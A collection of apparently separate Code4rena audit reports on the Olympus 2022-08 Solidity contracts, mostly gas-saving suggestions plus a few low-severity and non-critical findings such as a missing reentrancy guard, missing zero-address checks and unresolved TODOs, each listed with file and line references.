2022-08-olympus/src/policies/Operator.sol::195 => function operate() external override onlyWhileActive onlyRole("operator_operate") { 2022-08-olympus/src/policies/Operator.sol::510 => function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::516 => function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::548 => function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::618 => function regenerate(bool high_) external onlyRole("operator_admin") { 2022-08-olympus/src/policies/Operator.sol::624 => function toggleActive() external onlyRole("operator_admin") { 2022-08-olympus/src/policies/VoterRegistration.sol::45 => function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") { 2022-08-olympus/src/policies/VoterRegistration.sol::53 => function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") { ```  ## [G-06] Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   ``` 2022-08-olympus/src/Kernel.sol::85 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::95 => function KEYCODE() public pure virtual returns (Keycode) {} 2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::115 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {} 2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {} 2022-08-olympus/src/modules/INSTR.sol::20 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/TRSRY.sol::45 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/VOTES.sol::19 => {} 2022-08-olympus/src/policies/Governance.sol::59 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/PriceConfig.sol::15 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/TreasuryCustodian.sol::24 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/VoterRegistration.sol::16 => constructor(Kernel kernel_) Policy(kernel_) {} ```  ## [G-07] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ``` 2022-08-olympus/src/modules/PRICE.sol::44 => uint32 public nextObsIndex; 2022-08-olympus/src/modules/PRICE.sol::47 => uint32 public numObservations; 2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18; 2022-08-olympus/src/modules/PRICE.sol::84 => uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::87 => uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::127 => uint32 numObs = numObservations; 2022-08-olympus/src/modules/PRICE.sol::185 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; 2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4; 2022-08-olympus/src/policies/Operator.sol::485 => int8 decimals; 2022-08-olympus/src/policies/Operator.sol::665 => uint32 observe = _config.regenObserve; 2022-08-olympus/src/policies/interfaces/IOperator.sol::13 => uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%) 2022-08-olympus/src/policies/interfaces/IOperator.sol::14 => uint32 cushionDuration; // duration of a single cushion deployment in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::15 => uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::16 => uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::17 => uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%) 2022-08-olympus/src/policies/interfaces/IOperator.sol::18 => uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::19 => uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall 2022-08-olympus/src/policies/interfaces/IOperator.sol::20 => uint32 regenObserve; // number of price points to observe to determine regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::31 => uint32 count; // current number of price points that count towards regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::33 => uint32 nextObservation; // index of the next observation in the observations array ```  ## [G-08] Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. Use uint256(1) and uint256(2) for true/false instead  ``` 2022-08-olympus/src/Kernel.sol::113 => bool public isActive; 2022-08-olympus/src/Kernel.sol::181 => mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 2022-08-olympus/src/Kernel.sol::194 => mapping(address => mapping(Role => bool)) public hasRole; 2022-08-olympus/src/Kernel.sol::197 => mapping(Role => bool) public isRole; 2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized; 2022-08-olympus/src/policies/BondCallback.sol::24 => mapping(address => mapping(uint256 => bool)) public approvedMarkets; 2022-08-olympus/src/policies/Governance.sol::105 => mapping(uint256 => bool) public proposalHasBeenActivated; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; 2022-08-olympus/src/policies/Heart.sol::33 => bool public active; 2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized; 2022-08-olympus/src/policies/Operator.sol::66 => bool public active; ```  ## [G-09] <x> += <y> costs more gas than <x> = <x> + <y> for state variables  use <x> = <x> + <y> or <x> = <x> - <y> instead to save gas  ``` 2022-08-olympus/src/modules/PRICE.sol::136 => _movingAverage += (currentPrice - earliestPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::138 => _movingAverage -= (earliestPrice - currentPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::222 => total += startObservations_[i]; 2022-08-olympus/src/modules/TRSRY.sol::96 => reserveDebt[token_][msg.sender] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::97 => totalDebt[token_] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::115 => reserveDebt[token_][msg.sender] -= received; 2022-08-olympus/src/modules/TRSRY.sol::116 => totalDebt[token_] -= received; 2022-08-olympus/src/modules/TRSRY.sol::131 => if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; 2022-08-olympus/src/modules/TRSRY.sol::132 => else totalDebt[token_] -= oldDebt - amount_; 2022-08-olympus/src/modules/VOTES.sol::56 => balanceOf[from_] -= amount_; 2022-08-olympus/src/modules/VOTES.sol::58 => balanceOf[to_] += amount_; 2022-08-olympus/src/policies/BondCallback.sol::143 => _amountsPerMarket[id_][0] += inputAmount_; 2022-08-olympus/src/policies/BondCallback.sol::144 => _amountsPerMarket[id_][1] += outputAmount_; 2022-08-olympus/src/policies/Governance.sol::194 => totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 2022-08-olympus/src/policies/Governance.sol::198 => totalEndorsementsForProposal[proposalId_] += userVotes; 2022-08-olympus/src/policies/Governance.sol::252 => yesVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Governance.sol::254 => noVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Heart.sol::103 => lastBeat += frequency(); ```  ## [G-11] Use a more recent version of solidity  Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ``` 2022-08-olympus/src/policies/interfaces/IHeart.sol::2 => pragma solidity >=0.8.0; 2022-08-olympus/src/policies/interfaces/IOperator.sol::2 => pragma solidity >=0.8.0; ```  ## [G-12] Prefix increments cheaper than Postfix increments  ++i costs less gas than i++, especially when it's used in for-loops (--i/i-- too) Saves 5 gas PER LOOP  ``` 2022-08-olympus/src/utils/KernelUtils.sol::49 => i++; 2022-08-olympus/src/utils/KernelUtils.sol::64 => i++; ```  ## [G-13] Don't compare boolean expressions to boolean literals  The extran comparison wastes gas if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ``` 2022-08-olympus/src/policies/Governance.sol::223 => if (proposalHasBeenActivated[proposalId_] == true) { 2022-08-olympus/src/policies/Governance.sol::306 => if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## [G-14] Public functions not called by the contract should be declared external instead  Contracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so.  ``` 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) { 2022-08-olympus/src/modules/MINTR.sol::20 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/MINTR.sol::33 => function mintOhm(address to_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/MINTR.sol::37 => function burnOhm(address from_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/PRICE.sol::108 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/RANGE.sol::110 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/TRSRY.sol::47 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::22 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::45 => function transfer(address to_, uint256 amount_) public pure override returns (bool) { 2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { 2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) { ```  ## [G-15] Not using the named return variables when a function returns, wastes deployment gas  It is not necessary to have both a named return and a return statement.  ``` 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/MINTR.sol::25 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/PRICE.sol::113 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/RANGE.sol::115 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/TRSRY.sol::51 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/VOTES.sol::27 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/policies/BondCallback.sol::177 => returns (uint256 in_, uint256 out_) ```  ## [G-16] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate  Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  ``` 2022-08-olympus/src/modules/TRSRY.sol::33 => mapping(address => mapping(ERC20 => uint256)) public withdrawApproval; 2022-08-olympus/src/modules/TRSRY.sol::39 => mapping(ERC20 => mapping(address => uint256)) public reserveDebt; ```  ``` 2022-08-olympus/src/policies/Governance.sol::102 => mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 2022-08-olympus/src/policies/Governance.sol::114 => mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ## [G-17] Use assembly to check for address(0)  Saves 6 gas per instance if using assembly to check for address(0)  e.g. ``` assembly {  if iszero(_addr) {   mstore(0x00, "zero address")   revert(0x00, 0x20)  } } ```  instances:  ``` 2022-08-olympus/src/Kernel.sol::269 => if (address(getModuleForKeycode[keycode]) != address(0)) ```  ## [G-18] Using storage instead of memory for structs/arrays saves gas  When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.  Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct  ``` 2022-08-olympus/src/Kernel.sol::379 => Policy[] memory dependents = moduleDependents[keycode_]; ```  ## [G-19] internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  ``` 2022-08-olympus/src/Kernel.sol::131 => function getModuleAddress(Keycode keycode_) internal view returns (address) { 2022-08-olympus/src/Kernel.sol::266 => function _installModule(Module newModule_) internal { 2022-08-olympus/src/Kernel.sol::279 => function _upgradeModule(Module newModule_) internal { 2022-08-olympus/src/Kernel.sol::295 => function _activatePolicy(Policy policy_) internal { 2022-08-olympus/src/Kernel.sol::325 => function _deactivatePolicy(Policy policy_) internal { 2022-08-olympus/src/Kernel.sol::351 => function _migrateKernel(Kernel newKernel_) internal { 2022-08-olympus/src/Kernel.sol::378 => function _reconfigurePolicies(Keycode keycode_) internal { 2022-08-olympus/src/Kernel.sol::409 => function _pruneFromDependents(Policy policy_) internal { 2022-08-olympus/src/policies/Heart.sol::111 => function _issueReward(address to_) internal { 2022-08-olympus/src/policies/Operator.sol::652 => function _addObservation() internal { ```  ## [G-20] State variables only set in the constructor should be declared immutable  Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas).  ``` 2022-08-olympus/src/policies/BondCallback.sol::43 => aggregator = aggregator_; 2022-08-olympus/src/policies/BondCallback.sol::44 => ohm = ohm_; 2022-08-olympus/src/policies/Heart.sol::60 => _operator = operator_; 2022-08-olympus/src/policies/Operator.sol::144 => _status = Status({low: regen, high: regen}); ```  ## [G-21] internal functions not called by the contract should be removed to save deployment gas  If the functions are required by an interface, the contract should inherit from that interface and use the override keyword  ``` 2022-08-olympus/src/Kernel.sol::131 => function getModuleAddress(Keycode keycode_) internal view returns (address) { ``` 
### [G-01] Using bools for storage incurs overhead.   #### Impact   ```     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use ```uint256(1)``` and ```uint256(2)``` for true/false to avoid a Gwarmaccess ([100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past   #### Findings: ``` src/modules/PRICE.sol:L62    bool public initialized; src/policies/Heart.sol:L33    bool public active;  src/policies/Operator.sol:L63    bool public initialized;  src/policies/Operator.sol:L66    bool public active;  src/policies/BondCallback.sol:L24    mapping(address => mapping(uint256 => bool)) public approvedMarkets;  src/policies/Governance.sol:L105    mapping(uint256 => bool) public proposalHasBeenActivated;  src/policies/Governance.sol:L117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ###  [G-02] Cache Array Length Outside of Loop   #### Impact Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.   #### Findings: ``` src/policies/Governance.sol:L278        for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Empty blocks should be removed or emit something   #### Impact The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   #### Findings: ``` src/modules/VOTES.sol:L19    {}  src/modules/TRSRY.sol:L45    constructor(Kernel kernel_) Module(kernel_) {}  src/modules/INSTR.sol:L20    constructor(Kernel kernel_) Module(kernel_) {}  src/policies/PriceConfig.sol:L15    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/VoterRegistration.sol:L16    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/TreasuryCustodian.sol:L24    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/Governance.sol:L59    constructor(Kernel kernel_) Policy(kernel_) {}  ``` ### [G-04] Use a more recent version of solidity.   #### Impact Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining  Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads  Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings  Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.   #### Findings: ``` src/interfaces/IBondCallback.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IOperator.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IHeart.sol:L2      pragma solidity >=0.8.0; ```  ### [G-05] Functions guaranteed to revert when called by normal users can be declared as payable.   #### Impact If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.   #### Findings: ``` src/policies/Heart.sol:L130    function resetBeat() external onlyRole("heart_admin") {  src/policies/Heart.sol:L135    function toggleBeat() external onlyRole("heart_admin") {  src/policies/Heart.sol:L150    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {  src/policies/VoterRegistration.sol:L45    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {  src/policies/VoterRegistration.sol:L53    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {  src/policies/Operator.sol:L195    function operate() external override onlyWhileActive onlyRole("operator_operate") {  src/policies/Operator.sol:L510    function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L516    function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L548    function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L598    function initialize() external onlyRole("operator_admin") {  src/policies/Operator.sol:L618    function regenerate(bool high_) external onlyRole("operator_admin") {  src/policies/Operator.sol:L624    function toggleActive() external onlyRole("operator_admin") {  src/policies/BondCallback.sol:L152    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  src/policies/BondCallback.sol:L190    function setOperator(Operator operator_) external onlyRole("callback_admin") {  ```  ### [G-06] ```X += Y``` costs more gas than ```X = X + Y``` for state variables.   #### Impact Consider changing ```X += Y``` to ```X = X + Y``` to save gas.   #### Findings: ``` src/modules/VOTES.sol:L58            balanceOf[to_] += amount_;  src/modules/PRICE.sol:L136            _movingAverage += (currentPrice - earliestPrice) / numObs;  src/modules/PRICE.sol:L222            total += startObservations_[i];  src/modules/TRSRY.sol:L96        reserveDebt[token_][msg.sender] += amount_;  src/modules/TRSRY.sol:L97        totalDebt[token_] += amount_;  src/modules/TRSRY.sol:L131        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  src/policies/Heart.sol:L103        lastBeat += frequency();  src/policies/BondCallback.sol:L143        _amountsPerMarket[id_][0] += inputAmount_;  src/policies/BondCallback.sol:L144        _amountsPerMarket[id_][1] += outputAmount_;  src/policies/Governance.sol:L198        totalEndorsementsForProposal[proposalId_] += userVotes;  src/policies/Governance.sol:L252            yesVotesForProposal[activeProposal.proposalId] += userVotes;  src/policies/Governance.sol:L254            noVotesForProposal[activeProposal.proposalId] += userVotes;  ``` ### [G-07] ++i costs less gas than i++, especially when it's used in for loops.   #### Impact Saves 6 gas per instance.   #### Findings: ``` src/policies/Operator.sol:L488            decimals++;  src/policies/Operator.sol:L670                _status.low.count++;  src/policies/Operator.sol:L686                _status.high.count++;  src/utils/KernelUtils.sol:L49            i++;  src/utils/KernelUtils.sol:L64            i++; ```  ### [G-08] Using private rather than public for constants to saves gas.   #### Impact If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.   #### Findings: ``` src/modules/PRICE.sol:L59    uint8 public constant decimals = 18;  src/modules/RANGE.sol:L65    uint256 public constant FACTOR_SCALE = 1e4;  src/policies/Operator.sol:L89    uint32 public constant FACTOR_SCALE = 1e4;  src/policies/Governance.sol:L121    uint256 public constant SUBMISSION_REQUIREMENT = 100;  src/policies/Governance.sol:L124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  src/policies/Governance.sol:L127    uint256 public constant GRACE_PERIOD = 1 weeks;  src/policies/Governance.sol:L130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  src/policies/Governance.sol:L133    uint256 public constant EXECUTION_THRESHOLD = 33;  src/policies/Governance.sol:L137    uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ### [G-09] Explicit initialization with zero not required   #### Impact Explicit initialization with zero is not required for variable declaration because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.   #### Findings: ``` src/utils/KernelUtils.sol:L43    for (uint256 i = 0; i < 5; ) {  src/utils/KernelUtils.sol:L58    for (uint256 i = 0; i < 32; ) { ```  
### description  calldata should be used instead of memory for function parameters saves gas if the function argument is only read.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondTeller.sol#L43
# [G-01] Prefix increment costs less gas than postfix increment  There are 7 instances of this issue.  ``` File: src/policies/Operator.sol 488: decimals++; 670: _status.low.count++; 675: _status.low.count--; 686: _status.high.count++; 691: _status.high.count--; ```  ``` File: src/utils/KernelUtils.sol 49: i++; 64: i++; ```  # [G-02] Cache the length of the array before the loop  There is 1 instance of this issue.  ``` File: src/policies/Governance.sol 278: for (uint256 step; step < instructions.length; ) { ```  # [G-03] Initializing a variable with the default value wastes gas  There are 3 instances of this issue.  ``` File: src/Kernel.sol 397: for (uint256 i = 0; i < reqLength; ) { ```  ``` File: src/utils/KernelUtils.sol 43: for (uint256 i = 0; i < 5; ) { 58: for (uint256 i = 0; i < 32; ) { ```  # [G-04] Use != 0 instead of > 0 to save gas.  Replace `> 0` with `!= 0` for unsigned integers.  On the instance bellow `userVotesForProposal` is a nested mapping of uints.  ``` File: src/policies/Governance.sol 247: if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { ```  # [G-05] Use right/left shift instead of division/multiplication to save gas  There are 5 instances of this issue.  ``` File: src/policies/Operator.sol 372: int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419: uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420: uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427: int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786: ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  # [G-06] Don’t compare boolean expressions to boolean literals  There are 2 instances of this issue.  ``` File: src/policies/Governance.sol 223: if (proposalHasBeenActivated[proposalId_] == true) { 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  # [G-07] x += y costs more gas than x = x + y for state variables  There is 1 instance of this issue in `Price.sol` and 2 instances in `TRSRY.sol`  ``` File: src/modules/PRICE.sol 136: _movingAverage += (currentPrice - earliestPrice) / numObs; ```  ``` File: main/src/modules/TRSRY.sol 96: reserveDebt[token_][msg.sender] += amount_; 97: totalDebt[token_] += amount_; ```  # [G-08] Using private rather than public for constants, saves gas  The values can still be inspected on the source code if necessary.  There are 9 instances of this issue.  ``` File: src/modules/PRICE.sol 59: uint8 public constant decimals = 18; ```  ``` File: src/modules/RANGE.sol 65: uint256 public constant FACTOR_SCALE = 1e4; ```  ``` File: src/policies/Governance.sol 121: uint256 public constant SUBMISSION_REQUIREMENT = 100; 124: uint256 public constant ACTIVATION_DEADLINE = 2 weeks; 127: uint256 public constant GRACE_PERIOD = 1 weeks; 130: uint256 public constant ENDORSEMENT_THRESHOLD = 20; 133: uint256 public constant EXECUTION_THRESHOLD = 33; 137: uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ``` File: src/policies/Operator.sol 89: uint32 public constant FACTOR_SCALE = 1e4; ``` 
# [L-01] Missing nonReentrant for function not using checks-effects-interactions  The `batchToTresury` function has access control, but it's updating the state after external calls. Consider adding a `nonReetrancy` modifier.  ``` File: src/policies/BondCallback.sol function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {     ERC20 token;     uint256 balance;     uint256 len = tokens_.length;     for (uint256 i; i < len; ) {         token = tokens_[i];         balance = token.balanceOf(address(this));         token.safeTransfer(address(TRSRY), balance);         priorBalances[token] = token.balanceOf(address(this));          unchecked {             ++i;         }     } } ```  # [L-02] Missing zero address checks for setters  Consider adding checks against zero address when a function is receiving an input address.  ``` File: main/src/modules/TRSRY.sol 64: function setApprovalFor( 122: function setDebt( ```  # [NC-01] Non library files should use fixed compiler verion  Locking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version. Note that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.  There are 3 instances of this issue.  ``` File: src/interfaces/IBondCallback.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IHeart.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IOperator.sol 2: pragma solidity >=0.8.0; ```  # [NC-02] Public functions not called by the contract should be declared external  There are 2 instances of this issue  ``` File: src/policies/Governance.sol 151: function getActiveProposal() public view returns (ActivatedProposal memory) { 145: function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { ```  # [NC-03] Missing NATSPEC  Consider adding NATSPEC on all functions to enhance the project documentation.  ``` File: src/policies/Governance.sol 61: function configureDependencies() external override returns (Keycode[] memory dependencies) { 70: function requestPermissions() ```  # [NC-04] Lack of event when kernel grants or revoke status  Consider emitting an event when `setActiveStatus` is called to facilitate monitoring of the system.  ``` File: main/src/modules/TRSRY.sol 126: function setActiveStatus(bool activate_) external onlyKernel { ```  # [NC-05] TODOs should should be resolved before deployment  There are 4 instances of this issue.  ``` File: src/policies/Operator.sol 657: /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  ``` File: src/policies/TreasuryCustodian.sol 51: // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52: // TODO must reorg policy storage to be able to check for deactivated policies. 56: // TODO Make sure `policy_` is an actual policy and not a random address. ``` 
 ## Summary  G-01 Using calldata instead of memory for read-only arguments in external functions saves gas (1 instance) G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables (12 instances) G-03 internal functions only called once can be inlined to save gas (2 instances) G-04 Using bools for storage incurs overhead (11 instances) G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement (1 instance0 G-06 ++i costs less gas than i++, especially when it’s used in for-loops  (2 instances) G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead (88 instances) G-08 Using private rather than public for constants, saves gas (9 instances) G-09 Empty blocks should be removed or emit something (2 instances)  G-10 calldata instead of memory for read-only function parameter (5 instances)  Total: 133 instances in 10 issues   ## G-01 Using calldata instead of memory for read-only arguments in external functions saves gas When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  1 instance in 1 file: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162   ## G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables  12 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 